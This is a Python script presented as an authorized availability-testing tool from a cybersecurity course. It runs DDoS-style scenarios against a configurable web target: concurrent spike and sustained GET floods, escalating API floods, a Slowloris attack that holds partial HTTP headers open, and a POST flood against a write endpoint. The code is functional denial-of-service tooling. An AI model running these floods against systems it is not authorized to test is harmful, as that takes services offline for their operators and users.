#!/usr/bin/env python3
"""
ddos_sim.py — Web Application Availability & DDoS Simulation Tool
──────────────────────────────────────────────────────────────────
Author : Eav Puthcambo (userCambo) — AUPP Cybersecurity Programme
Purpose: Authorized single-source availability testing for web applications.
         Simulates DDoS-style load patterns from a single machine to measure
         how a platform degrades under concurrent traffic.

⚠  WARNING: Only run this against systems you are explicitly authorized to test.
   Unauthorized use constitutes a criminal offence in most jurisdictions.

Scenarios
─────────────────────────────────────────────────────────────────────────────
  T-07  Spike Test       — sudden burst of N concurrent users (cold start)
  T-08  Sustained Load   — M concurrent users held for DURATION seconds
  T-09  Endpoint Flood   — escalating waves targeting API endpoints
  T-10  Slow Request     — Slowloris-style partial HTTP headers (non-destructive)
  T-11  POST Flood       — rapid concurrent POST requests to a write endpoint
  T-12  Recovery Check   — verify platform self-recovers after load ceases

Usage
─────
  1. Set TARGET to your authorized target (e.g. https://example.com)
  2. Optionally set SESSION to a valid session cookie value for T-11
  3. Run:  python3 ddos_sim.py

Results are printed to terminal. JSON summary saved to ddos_results.json.
"""

import requests
import time
import threading
import json
import random
import string
import sys
import socket
import ssl
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

urllib3 = __import__('urllib3')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── Configuration — edit these before running ─────────────────────────────────
TARGET   = 'https://example.com'   # ← set your authorized target here
SESSION  = ''                       # ← paste session cookie value (optional)
TIMEOUT  = 15                       # seconds per request

# ── Spike test settings ───────────────────────────────────────────────────────
SPIKE_CONCURRENCY = 200             # T-07: concurrent users in cold burst

# ── Sustained load settings ───────────────────────────────────────────────────
SUSTAINED_CONCURRENCY = 150         # T-08: concurrent users
SUSTAINED_DURATION    = 60          # T-08: seconds to hold load

# ── API flood settings ────────────────────────────────────────────────────────
# Endpoints to target during T-09 flood — customize to match your target
FLOOD_ENDPOINTS = [
    f'{TARGET}/api/scoreboard',
    f'{TARGET}/api/challenges',
    f'{TARGET}/api/users/1',
]

# ── Slowloris settings ────────────────────────────────────────────────────────
SLOWLORIS_CONNS    = 50             # T-10: number of slow connections
SLOWLORIS_HOLD     = 20             # T-10: seconds to hold each connection
SLOWLORIS_HOST     = ''             # T-10: hostname (extracted from TARGET below)
SLOWLORIS_PORT     = 443            # T-10: port (443 for HTTPS, 80 for HTTP)

# ── POST flood settings ───────────────────────────────────────────────────────
POST_ENDPOINT      = f'{TARGET}/api/submit'   # T-11: write endpoint to flood
POST_CONCURRENCY   = 100                       # T-11: concurrent POST requests

# ── Results storage ───────────────────────────────────────────────────────────
RESULTS = {}
_lock   = threading.Lock()

HEADERS_BASE = {
    'User-Agent': 'PenTest-Tool/1.0 (authorized)',
    'Accept':     'text/html,application/json,*/*',
}

# ── Extract hostname from TARGET for Slowloris ────────────────────────────────
from urllib.parse import urlparse
_parsed = urlparse(TARGET)
SLOWLORIS_HOST = _parsed.hostname or ''
if not SLOWLORIS_PORT:
    SLOWLORIS_PORT = 443 if _parsed.scheme == 'https' else 80


# ── Helpers ───────────────────────────────────────────────────────────────────

def auth_headers():
    h = dict(HEADERS_BASE)
    if SESSION:
        h['Cookie'] = f'session={SESSION}'
    return h

def record(scenario, code, elapsed_ms, error=None):
    with _lock:
        if scenario not in RESULTS:
            RESULTS[scenario] = {'times': [], 'codes': {}, 'errors': []}
        RESULTS[scenario]['times'].append(elapsed_ms)
        key = str(code)
        RESULTS[scenario]['codes'][key] = RESULTS[scenario]['codes'].get(key, 0) + 1
        if error:
            RESULTS[scenario]['errors'].append(error)

def do_get(url, scenario, headers=None):
    h = headers or HEADERS_BASE
    try:
        t0 = time.time()
        r  = requests.get(url, headers=h, verify=False, timeout=TIMEOUT,
                          allow_redirects=True)
        elapsed = int((time.time() - t0) * 1000)
        record(scenario, r.status_code, elapsed)
        return r.status_code, elapsed
    except requests.exceptions.Timeout:
        record(scenario, 0, TIMEOUT * 1000, 'TIMEOUT')
        return 0, TIMEOUT * 1000
    except Exception as e:
        record(scenario, 0, 0, str(e)[:80])
        return 0, 0

def do_post(url, data, scenario, headers=None):
    h = headers or HEADERS_BASE
    try:
        t0 = time.time()
        r  = requests.post(url, data=data, headers=h, verify=False, timeout=TIMEOUT)
        elapsed = int((time.time() - t0) * 1000)
        record(scenario, r.status_code, elapsed)
        return r.status_code, elapsed
    except requests.exceptions.Timeout:
        record(scenario, 0, TIMEOUT * 1000, 'TIMEOUT')
        return 0, TIMEOUT * 1000
    except Exception as e:
        record(scenario, 0, 0, str(e)[:80])
        return 0, 0

def print_stats(scenario):
    d      = RESULTS.get(scenario, {})
    times  = d.get('times', [])
    codes  = d.get('codes', {})
    errors = d.get('errors', [])
    if not times:
        return
    ok       = sum(v for k, v in codes.items() if k.startswith('2'))
    fail     = sum(v for k, v in codes.items() if not k.startswith('2'))
    err_rate = (fail / len(times)) * 100
    sorted_t = sorted(times)
    p50      = sorted_t[int(len(sorted_t) * 0.50)]
    p95      = sorted_t[int(len(sorted_t) * 0.95)]
    print(f'\n  [STATS] {scenario}')
    print(f'     Requests : {len(times)}')
    print(f'     OK/Fail  : {ok} / {fail}  ({err_rate:.1f}% error rate)')
    print(f'     Avg/p50  : {int(sum(times)/len(times))}ms / {p50}ms')
    print(f'     p95/Max  : {p95}ms / {max(times)}ms')
    print(f'     Status   : {dict(sorted(codes.items()))}')
    if errors:
        print(f'     Errors   : {list(set(errors))[:5]}')

def banner(msg):
    print(f'\n{"─"*60}')
    print(f'  {msg}')
    print(f'{"─"*60}')

def baseline_check(label='BASELINE'):
    """Single-request probe to confirm target is alive."""
    code, ms = do_get(f'{TARGET}/', 'baseline_probe')
    status   = 'UP' if code == 200 else f'DOWN (HTTP {code})'
    print(f'  [{label}]  / -> {status}  {ms}ms')
    return code == 200


# ── T-07: Spike Test ──────────────────────────────────────────────────────────

def t07_spike():
    banner(f'T-07  SPIKE TEST — {SPIKE_CONCURRENCY} concurrent users (cold burst)')
    SCENARIO  = 'T07_spike'
    endpoints = [
        f'{TARGET}/',
        f'{TARGET}/challenges',
        f'{TARGET}/scoreboard',
    ]

    print(f'  Launching {SPIKE_CONCURRENCY} concurrent requests simultaneously...')

    def worker(_):
        return do_get(random.choice(endpoints), SCENARIO)

    t_start = time.time()
    with ThreadPoolExecutor(max_workers=SPIKE_CONCURRENCY) as ex:
        futures = [ex.submit(worker, i) for i in range(SPIKE_CONCURRENCY)]
        for f in as_completed(futures):
            pass
    wall = int((time.time() - t_start) * 1000)
    print(f'  All {SPIKE_CONCURRENCY} requests completed in {wall}ms wall time')
    print_stats(SCENARIO)


# ── T-08: Sustained Load ──────────────────────────────────────────────────────

def t08_sustained():
    banner(f'T-08  SUSTAINED LOAD — {SUSTAINED_CONCURRENCY} users for {SUSTAINED_DURATION}s')
    SCENARIO   = 'T08_sustained'
    endpoints  = [
        f'{TARGET}/',
        f'{TARGET}/challenges',
        f'{TARGET}/scoreboard',
    ]
    stop_event = threading.Event()
    req_count  = [0]

    def worker():
        while not stop_event.is_set():
            do_get(random.choice(endpoints), SCENARIO)
            with _lock:
                req_count[0] += 1

    threads = [threading.Thread(target=worker, daemon=True)
               for _ in range(SUSTAINED_CONCURRENCY)]
    t_start = time.time()
    for th in threads:
        th.start()

    for checkpoint in range(10, SUSTAINED_DURATION + 1, 10):
        time.sleep(10)
        elapsed = int(time.time() - t_start)
        with _lock:
            n = req_count[0]
        d     = RESULTS.get(SCENARIO, {})
        times = d.get('times', [])
        avg   = int(sum(times[-500:]) / len(times[-500:])) if times else 0
        codes = d.get('codes', {})
        errs  = sum(v for k, v in codes.items() if not k.startswith('2'))
        err_pct = (errs / max(n, 1)) * 100
        print(f'  @{elapsed:3d}s  requests: {n:5d}  avg(last 500): {avg}ms  '
              f'errors: {err_pct:.1f}%  codes: {dict(sorted(codes.items()))}')

    stop_event.set()
    for th in threads:
        th.join(timeout=5)
    print_stats(SCENARIO)


# ── T-09: API Endpoint Flood ──────────────────────────────────────────────────

def t09_api_flood():
    banner('T-09  API ENDPOINT FLOOD — escalating waves')
    SCENARIO = 'T09_api_flood'

    def worker(_):
        return do_get(random.choice(FLOOD_ENDPOINTS), SCENARIO, auth_headers())

    for wave, label in [(50, 'Wave 1 — 50'), (100, 'Wave 2 — 100'), (150, 'Wave 3 — 150')]:
        print(f'\n  >> {label} concurrent API requests')
        with ThreadPoolExecutor(max_workers=wave) as ex:
            futures = [ex.submit(worker, i) for i in range(wave)]
            for f in as_completed(futures):
                pass
    print_stats(SCENARIO)


# ── T-10: Slowloris ───────────────────────────────────────────────────────────

def t10_slowloris():
    banner(f'T-10  SLOWLORIS — {SLOWLORIS_CONNS} partial connections over {SLOWLORIS_HOLD}s')
    SCENARIO = 'T10_slowloris'
    results  = []

    def slow_conn():
        try:
            raw  = socket.create_connection((SLOWLORIS_HOST, SLOWLORIS_PORT), timeout=10)
            ctx  = ssl.create_default_context()
            sock = ctx.wrap_socket(raw, server_hostname=SLOWLORIS_HOST)
            sock.send(b'GET / HTTP/1.1\r\n')
            sock.send(f'Host: {SLOWLORIS_HOST}\r\n'.encode())
            sock.send(b'User-Agent: PenTest-Tool/1.0\r\n')
            t0 = time.time()
            for _ in range(SLOWLORIS_HOLD // 2):
                time.sleep(2)
                sock.send(f'X-Custom-{random.randint(1,9999)}: keep\r\n'.encode())
            elapsed = int((time.time() - t0) * 1000)
            sock.close()
            results.append(('held', elapsed))
        except Exception as e:
            results.append(('blocked', str(e)[:50]))

    print(f'  Opening {SLOWLORIS_CONNS} slow connections...')
    threads = [threading.Thread(target=slow_conn, daemon=True)
               for _ in range(SLOWLORIS_CONNS)]
    t_start = time.time()
    for th in threads:
        th.start()
    for th in threads:
        th.join(timeout=SLOWLORIS_HOLD + 15)

    wall    = int(time.time() - t_start)
    held    = sum(1 for r in results if r[0] == 'held')
    blocked = sum(1 for r in results if r[0] == 'blocked')
    print(f'  Held: {held}  |  Blocked/Errored: {blocked}  |  Wall: {wall}s')
    print(f'  Checking target availability after Slowloris...')
    alive = baseline_check('POST-T10')
    RESULTS[SCENARIO] = {
        'connections_attempted': SLOWLORIS_CONNS,
        'connections_held':      held,
        'connections_blocked':   blocked,
        'target_alive_after':    alive,
    }


# ── T-11: POST Flood ──────────────────────────────────────────────────────────

def t11_post_flood():
    banner(f'T-11  POST FLOOD — {POST_CONCURRENCY} concurrent POSTs to write endpoint')
    SCENARIO = 'T11_post_flood'

    def worker(_):
        # Generate a random payload — customize field names for your target
        payload = {
            'submission': ''.join(random.choices(string.ascii_lowercase, k=16)),
        }
        do_post(POST_ENDPOINT, payload, SCENARIO, auth_headers())

    print(f'  Sending {POST_CONCURRENCY} concurrent POST requests to {POST_ENDPOINT}')
    with ThreadPoolExecutor(max_workers=POST_CONCURRENCY) as ex:
        futures = [ex.submit(worker, i) for i in range(POST_CONCURRENCY)]
        for f in as_completed(futures):
            pass
    print_stats(SCENARIO)


# ── T-12: Recovery Check ──────────────────────────────────────────────────────

def t12_recovery():
    banner('T-12  RECOVERY CHECK — platform health after all load tests')
    print('  Waiting 10 seconds for target to settle...')
    time.sleep(10)

    check_endpoints = [
        ('Homepage',   f'{TARGET}/'),
        ('Challenges', f'{TARGET}/challenges'),
        ('Scoreboard', f'{TARGET}/scoreboard'),
    ]

    all_ok = True
    for label, url in check_endpoints:
        code, ms = do_get(url, 'T12_recovery')
        icon = 'OK' if code == 200 else f'FAIL ({code})'
        print(f'  {icon:<12} {label:<18} {ms}ms')
        if code != 200:
            all_ok = False

    print(f'\n  Target fully recovered: {"YES" if all_ok else "NO — some endpoints down"}')
    return all_ok


# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    print('=' * 60)
    print('  Web Application DDoS / Availability Simulation')
    print(f'  Target : {TARGET}')
    print(f'  Started: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}')
    print('=' * 60)

    if TARGET == 'https://example.com':
        print('\n  [!] TARGET is still set to the placeholder.')
        print('      Edit the TARGET variable at the top of this script.')
        sys.exit(1)

    print('\n  Pre-test check:')
    if not baseline_check('PRE-TEST'):
        print('\n  [!] Target appears DOWN before testing. Aborting.')
        sys.exit(1)

    t07_spike();       time.sleep(5)
    t08_sustained();   time.sleep(5)
    t09_api_flood();   time.sleep(5)
    t10_slowloris();   time.sleep(5)
    t11_post_flood();  time.sleep(5)
    t12_recovery()

    # ── Final Summary ──────────────────────────────────────────────
    print('\n' + '=' * 60)
    print('  FINAL SUMMARY')
    print('=' * 60)
    for scenario in ['T07_spike', 'T08_sustained', 'T09_api_flood',
                     'T11_post_flood', 'T12_recovery']:
        d     = RESULTS.get(scenario, {})
        times = d.get('times', [])
        codes = d.get('codes', {})
        if not times:
            continue
        ok   = sum(v for k, v in codes.items() if k.startswith('2'))
        fail = sum(v for k, v in codes.items() if not k.startswith('2'))
        avg  = int(sum(times) / len(times))
        p95  = sorted(times)[int(len(times) * 0.95)]
        err  = (fail / len(times)) * 100
        print(f'  {scenario:<22} {len(times):4d} reqs  avg {avg:5d}ms  '
              f'p95 {p95:5d}ms  err {err:5.1f}%')
    print('=' * 60)
    print(f'  Finished: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}')
    print('=' * 60)

    # Save JSON
    try:
        with open('ddos_results.json', 'w') as f:
            json.dump(RESULTS, f, indent=2)
        print('\n  Results saved to ddos_results.json')
    except Exception as e:
        print(f'\n  [!] Could not save JSON: {e}')


if __name__ == '__main__':
    main()
